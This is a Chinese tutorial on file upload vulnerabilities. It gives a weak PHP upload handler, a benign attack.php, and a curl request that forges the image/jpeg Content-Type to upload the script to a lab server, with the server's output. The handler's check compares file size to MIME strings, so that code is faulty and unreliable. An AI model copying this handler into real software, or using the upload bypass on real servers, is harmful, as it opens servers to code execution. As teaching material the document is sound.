上传文件漏洞也是一种常见的web漏洞，攻击者可以用利用服务器端的上传文件漏洞绕过安全验证将代码提交到服务器端，并想办法让代码文件被执行。一单可执行的代码上传成功，会造成比较严重的安全问题，比如获取服务器权限，为攻击者开后门，或者让服务器超载，破快服务器的可用性，甚至是上传病毒，木马。

​

​ 我们通过一个例子演示利用文件上传漏洞进行攻击的例子，下面的代码负责接受上传文件，并保存在`./uploads/`目录中（在单机应用的场景下，文件和应用程序保存在一起是比较常见的）。

```
<?php
//上传文件路径
$upload_path = "./uploads/";
$upload_file_path = $upload_path . basename($_FILES['uploadedfile']['name']);

$size = $_FILES['uploadedfile']['size'];
$type = $_FILES['uploadedfile']['type'];

//验证文件大小和文件类型
if ($size < 1000000 && ($size == 'image/jpeg' || $size == 'image/png')) {

    print_r($_FILES['uploadedfile']);
    echo "\n";

    if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $upload_file_path)) {
        echo "上传成功\n";
    } else {
        echo "上传失败\n";
    }
}
?>
```

上面的代码有基本的校验逻辑，比如文件大小验证，和文件类型验证，看似问题不大，其实不然。我们构造一个 php 脚本，代码如下，通过 curl 命令伪造成图片类型并上传。

PHP 脚本，文件名为 attack.php

```
<?php
echo "attack success !!!";
?>
```

使用 curl 命令上传文件，并将 Content-Type 改成

`image/jpeg`

。



```
$ curl 'http://192.168.56.101/upload.php'  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCHKmsM8kfbHlN8Ff' --data-binary $'------WebKitFormBoundaryCHKmsM8kfbHlN8Ff\r\nContent-Disposition: form-data; name="uploadedfile"; filename="attack.php"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryCHKmsM8kfbHlN8Ff--\r\n'

Array
(
    [name] => attack.php
    [type] => image/jpeg
    [tmp_name] => /home/bitnami-nginxstack/php/tmp/phpjWsmp3
    [error] => 0
    [size] => 0
)

上传成功
```



